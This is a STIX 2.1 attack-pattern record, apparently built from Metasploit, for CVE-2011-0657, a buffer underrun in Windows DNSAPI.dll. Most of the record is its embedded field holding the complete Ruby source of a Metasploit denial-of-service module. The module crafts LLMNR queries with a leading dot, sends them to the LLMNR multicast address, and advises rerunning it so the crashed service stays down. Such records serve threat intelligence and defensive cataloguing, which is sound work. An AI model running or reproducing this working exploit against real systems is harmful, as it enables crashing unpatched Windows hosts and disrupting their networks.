{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f11ae294-e3d3-4567-848a-bcb5af8a83a9",
    "created": "2024-08-14T16:25:07.523096Z",
    "modified": "2024-08-14T16:25:07.523101Z",
    "name": "Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS",
    "description": " This module exploits a buffer underrun vulnerability in Microsoft's DNSAPI.dll as distributed with Windows Vista and later without KB2509553. By sending a specially crafted LLMNR query, containing a leading '.' character, an attacker can trigger stack exhaustion or potentially cause stack memory corruption.  Although this vulnerability may lead to code execution, it has not been proven to be possible at the time of this writing.  NOTE: In some circumstances, a '.' may be found before the top of the stack is reached. In these cases, this module may not be able to cause a crash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/llmnr/ms11_030_dnsapi.rb",
            "external_id": "ms11_030_dnsapi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0657"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS',\n      'Description' => %q{\n          This module exploits a buffer underrun vulnerability in Microsoft's DNSAPI.dll\n        as distributed with Windows Vista and later without KB2509553. By sending a\n        specially crafted LLMNR query, containing a leading '.' character, an attacker\n        can trigger stack exhaustion or potentially cause stack memory corruption.\n\n        Although this vulnerability may lead to code execution, it has not been proven\n        to be possible at the time of this writing.\n\n        NOTE: In some circumstances, a '.' may be found before the top of the stack is\n        reached. In these cases, this module may not be able to cause a crash.\n      },\n      'Author'      => 'jduck',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2011-0657' ],\n          [ 'OSVDB', '71780' ],\n          [ 'MSB', 'MS11-030' ]\n        ],\n      'DisclosureDate' => 'Apr 12 2011')\n\n    register_options(\n      [\n        Opt::RPORT(5355),\n        Opt::RHOST('224.0.0.252')\n      ])\n  end\n\n  def make_query(str)\n    pkt = \"\"\n\n    # id\n    pkt << [rand(65535)].pack('n')\n\n    # flags\n    pkt << [(\n      '0' +     # qr\n      '0000' +  # opcode\n      '0' +     # conflict\n      '0' +     # truncation\n      '0' +     # tenative\n      '0000' +  # zero (reserved)\n      '0000'    # rcode\n      )].pack('B16')\n\n    # counts\n    pkt << [1,0,0,0].pack('n*')\n\n    if str[0,1] == \".\"\n      pkt << [str.length].pack('C')\n    end\n    pkt << str + \"\\x00\"\n\n    # type / class (PTR/IN)\n    pkt << [0x0c, 0x01].pack('n*')\n\n    pkt\n  end\n\n\n  def run\n    connect_udp\n\n    # query\n\n    # various compressed queries\n    #pkt << \"\\x03\" + (\"%d\" % 192)\n    #pkt << \"\\x03\" + \"144\" + \"\\x01\" + \"0\" + \"\\x03\" + \"168\" + \"\\x03\" + \"192\"\n    #pkt << (\"\\x01\" + '1') * 0x20\n    #pkt << \"\\x01\" + '.'\n    #pkt << (\"\\x01\\x2e\") + \"\\x01\" + \"0\"\n    #pkt << \"\\x07\" + 'in-addr' + \"\\x04\" + 'arpa' + \"\\x00\"\n    #pkt << \"\\x03\" + 'ip6' + \"\\x04\" + 'arpa' + \"\\x00\"\n    #pkt << \".e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f\".gsub('.', \"\\x01\") + \"\\x03ip6\\x04arpa\\x00\"\n\n    pkt = make_query(\".1.1.ip6.arpa\")\n    print_status(\"Sending Ipv6 LLMNR query to #{rhost}\")\n    udp_sock.put(pkt)\n\n    pkt = make_query(\".1.1.in-addr.arpa\")\n    print_status(\"Sending Ipv4 LLMNR query to #{rhost}\")\n    udp_sock.put(pkt)\n\n    print_status(\"Note, in a default configuration, the service will restart automatically twice.\")\n    print_status(\"In order to ensure it is completely dead, wait up to 5 minutes and run it again.\")\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "Apr 12 2011"
}